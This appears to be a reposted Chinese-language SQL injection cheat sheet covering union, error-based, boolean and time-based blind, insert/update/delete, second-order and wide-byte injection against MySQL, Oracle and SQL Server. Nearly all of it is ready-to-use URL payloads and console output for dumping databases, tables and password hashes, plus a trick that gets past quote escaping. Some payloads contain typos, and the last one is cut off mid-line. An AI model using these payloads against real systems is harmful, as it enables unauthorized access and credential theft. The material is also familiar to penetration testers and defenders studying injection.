微信公众号：[浪尖大数据]

# 一、Mysql手工注入

## 1.1联合注入

```sql
?id=1' order by 4--+
?id=0' union select 1,2,3,database()--+
?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
?id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name="users" --+
#group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name

?id=0' union select 1,2,3,group_concat(password) from users --+
#group_concat 可替换为 concat_ws(',',id,users,password )

?id=0' union select 1,2,3,password from users limit 0,1--+
```



## 1.2报错注入

```
1.floor()
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

2.extractvalue()
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

3.updatexml()
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

4.geometrycollection()
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5.multipoint()
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

6.polygon()
select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

7.multipolygon()
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

8.linestring()
select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

9.multilinestring()
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

10.exp()
select * from test where id=1 and exp(~(select * from(select user())a));
```

每个一个报错语句都有它的原理：

exp（）报错的原理：exp是一个数学函数，取e的x次方，当我们输入的值大于709将报错，然后〜取反它的值总会大于709，所以报错。

updatexml（）报错的原理：由于updatexml的第二个参数需要Xpath格式的字符串，以〜开头的内容不是xml格式的语法，concat（）函数为串联连接函数而不符合规则，但嵌套内的执行结果以错误的形式报出，这样就可以实现报错注入了。

```
爆库：?id=1' and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +
爆表：?id=1' and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +
爆字段：?id=1' and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
爆数据：?id=1' and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +

#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)
```

这里需要注意的是它加了连接字符，导致数据中的md5只能爆出31位，这里可以用分割函数分割出来：

```
substr(string string,num start,num length);
#string为字符串,start为起始位置,length为长度

?id=1' and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +
```



## 1.3盲注

### 1.3.1时间盲注

时间盲注也叫延迟注入一般用到函数sleep（）BENCHMARK（）还可以使用笛卡尔积（尽量不要使用，内容太多会很慢很慢）

一般时间盲注我们还需要使用条件判断函数

```
#if（expre1，expre2，expre3）
当 expre1 为 true 时，返回 expre2，false 时，返回 expre3

#盲注的同时也配合着 mysql 提供的分割函
substr、substring、left
```

我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有ascii（）hex（）等等

```
?id=1' and if(ascii(substr(database(),1,1))>115,1,sleep(5))--+
?id=1' and if((substr((select user()),1,1)='r'),sleep(5),1)--+
```

### **1.3.2布尔盲注**

```
?id=1' and substr((select user()),1,1)='r' -- +
?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- +
#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值

?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- +
#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1
```

## 1.4插入，删除，更新 

插入，删除，更新主要是用到盲注和报错注入，这种注入点不建议使用sqlmap等工具，会产生大量垃圾数据，一般这种注入会出现在编码，ip头，留言板等等需要写入数据的地方，同时这种注入不报错一般较难发现，我们可以尝试性插入，引号，双引号，转义符\让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入

### 1.4.1报错

```
mysql> insert into admin (id,username,password) values (2,"or updatexml(1,concat(0x7e,(version())),0) or","admin");
Query OK, 1 row affected (0.00 sec)

mysql> select * from admin;
+------+-----------------------------------------------+----------+
| id   | username                                      | password |
+------+-----------------------------------------------+----------+
|    1 | admin                                         | admin    |
|    1 | and 1=1                                       | admin    |
|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
+------+-----------------------------------------------+----------+
3 rows in set (0.00 sec)

mysql> insert into admin (id,username,password) values (2,""or updatexml(1,concat(0x7e,(version())),0) or"","admin");
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'

#delete 注入很危险，很危险，很危险，切记不能使用 or 1=1 ，or 右边一定要为false
mysql> delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'
```

### 1.4.2盲注

```
#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等
mysql> insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',"admin");
Query OK, 1 row affected (5.00 sec)

mysql> insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',"admin");
Query OK, 1 row affected (0.00 sec)

#字符型注意闭合不能使用and
mysql> insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',"admin");
Query OK, 1 row affected (0.00 sec)

mysql> insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',"admin");
Query OK, 1 row affected (5.01 sec)

# delete 函数 or 右边一定要为 false
mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0);
Query OK, 0 rows affected (0.00 sec)

mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);
Query OK, 0 rows affected (5.00 sec)

#update 更新数据内容
mysql> select * from admin;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    2 | 1        | admin    |
|    2 | 1        | admin    |
|    2 | 1        | admin    |
|    2 | admin    | admin    |
+------+----------+----------+
4 rows in set (0.00 sec)

mysql> update admin set id="5"+sleep(5)+"" where id=2;
Query OK, 4 rows affected (20.00 sec)
Rows matched: 4  Changed: 4  Warnings: 0
```

## 1.5二次注入与宽字节注入 

二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码他，这样就不会带有单引号等。

```
mysql> insert into admin (id,name,pass) values ('3',0x61646d696e272d2d2b,'11');
Query OK, 1 row affected (0.00 sec)

mysql> select * from admin;
+----+-----------+-------+
| id | name      | pass  |
+----+-----------+-------+
|  1 | admin     | admin |
|  2 | admin'111 | 11111 |
|  3 | admin'--+ | 11    |
+----+-----------+-------+
4 rows in set (0.00 sec)
```

二次注入在没有二进制的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将admin'-+误认为admin帐户

宽字节注入：针对目标已达到一定的防护，单引号转换为 `\'` ，mysql转换 `\` 编码为 `%5c` ，宽字节中两个字节代表一个汉字，所以把 `%df` 加上 `%5c` 就变成了一个汉字“运”，使用这种方法成功绕过过转义，就是所谓的宽字节注入

```
id=-1%df' union select...

#没使用宽字节
%27 -> %5C%27

#使用宽字节
%df%27 -> %df%5c%27 -> 運'
```



# 二、Oracle手工注入

## 2.1联合注入

```
?id=-1' union select user,null from dual--
?id=-1' union select version,null from v$instance--
?id=-1' union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--
?id=-1' union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=2)--
?id=-1' union select username,passwd from users--
?id=-1' union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--
```

## 2.2报错注入

```
?id=1' and 1=ctxsys.drithsx.sn(1,(select user from dual))--
?id=1' and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like 'Oracle%))--
?id=1' and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--
?id=1' and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=3))--
?id=1' and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))--
```



## 2.3盲注

### 2.3.1布尔盲注

既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用if else结束，如果这种复杂的，还可以使用encode（）函数。
语法：decode（条件，值1，返回值1，值2，返回值2，...值n，返回值n，更改值）;

该函数的含义如下：

```
IF 条件=值1 THEN
　　　　RETURN(返回值1)
ELSIF 条件=值2 THEN
　　　　RETURN(返回值2)
　　　　......
ELSIF 条件=值n THEN
　　　　RETURN(返回值n)
ELSE
　　　　RETURN(缺省值)
END IF
```

```
?id=1' and 1=(select decode(user,'SYSTEM',1,0,0) from dual)--
?id=1' and 1=(select decode(substr(user,1,1),'S',1,0,0) from dual)--
?id=1' and ascii(substr(user,1,1))> 64--  #二分法


```

### 2.3.2时间盲注

可使用DBMS_PIPE.RECEIVE_MESSAGE（'任意值'，延迟时间）函数进行时间盲注，这个函数可以指定延迟的时间

```
?id=1' and 1=(case when ascii(substr(user,1,1))> 128 then DBMS_PIPE.RECEIVE_MESSAGE('a',5) else 1 end)--
?id=1' and 1=(case when ascii(substr(user,1,1))> 64 then DBMS_PIPE.RECEIVE_MESSAGE('a',5) else 1 end)--
```

# 三、SQL Server手工注入

## 3.1联合注入 

```
?id=-1' union select null,null--
?id=-1' union select @@servername, @@version--
?id=-1' union select db_name(),suser_sname()--
?id=-1' union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--
?id=-1' union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--
?id--1' union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--
?id=-1' union select (select top 1 column name from information_schema.columns where table_name='users' and column_name not in (select top 1 column_name from information_schema.columns where table_name = 'users')),null---
?id=-1' union select (select top 1 username from users where username not in (select top 3 username from users)),null--
```

## 3.2报错注入

```
?id=1' and 1=(select 1/@@servername)--
?id=1' and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--
```

## 3.3盲注 

### 3.3.1布尔盲注

```
?id=1' and ascii(substring((select db_ name(1)),1,1))> 64--
```

### 3.3.2时间盲注

```
?id= 1';if(2>1) waitfor delay '0:0:5'--
?id= 1';if(ASCII(SUBSTRING((select db_name(1)),1,1))> 64) wai
```